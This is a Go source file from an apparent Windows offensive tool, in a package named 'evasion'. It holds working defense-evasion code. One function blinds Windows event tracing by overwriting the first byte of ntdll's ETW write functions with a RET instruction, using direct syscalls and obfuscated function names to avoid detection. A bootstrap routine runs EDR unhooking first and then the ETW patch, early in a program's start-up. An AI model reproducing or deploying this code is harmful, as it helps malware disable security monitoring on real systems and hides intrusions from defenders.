//go:build windows

package evasion

import (
	"strings"
	"unsafe"
)

// PatchETW disables key ETW providers by patching their write functions with a RET instruction.
// This kills most user-mode telemetry before any collection begins.
func PatchETW() {
	ntdll := FindModule(strings.ToLower(Obf(SNtdll)))
	if ntdll == nil {
		return
	}

	// Patch each ETW write function
	targets := [][]byte{SEtwEventWrite, SEtwEventWriteFull, SNtTraceEvent}
	for _, t := range targets {
		name := Obf(t)
		va := resolveExport(ntdll.Base, name)
		if va == 0 {
			continue
		}
		patchFuncRET(va)
	}
}

// patchFuncRET writes a RET (0xC3) as the first byte of a function,
// making it a no-op that returns immediately.
// Uses NtProtectVirtualMemory via direct syscall to avoid detection.
func patchFuncRET(funcVA uintptr) {
	base := funcVA
	size := uintptr(1)
	var oldProtect uint32

	// Make the page writable
	status := NtProtectVirtualMemory(
		uintptr(0xFFFFFFFFFFFFFFFF), // NtCurrentProcess()
		&base,
		&size,
		pageExecuteReadWrite,
		&oldProtect,
	)
	if status != 0 {
		return
	}

	// Write RET instruction
	*(*byte)(unsafe.Pointer(funcVA)) = 0xC3

	// Restore original protection
	NtProtectVirtualMemory(
		uintptr(0xFFFFFFFFFFFFFFFF),
		&base,
		&size,
		oldProtect,
		&oldProtect,
	)
}

// Bootstrap runs all evasion primitives in the correct order.
// Call this as early as possible in main().
// safe=true: skip operations that may crash in restricted environments.
func Bootstrap(noUnhook, noETW bool) {
	// 1. Unhook EDR DLLs first (restores clean syscall paths)
	if !noUnhook {
		UnhookEDRs()
	}

	// 2. Patch ETW (after unhooking, so our patch isn't immediately re-hooked)
	if !noETW {
		PatchETW()
	}

	// 3. Syscall table is lazy-initialized on first call — nothing to do here.
}
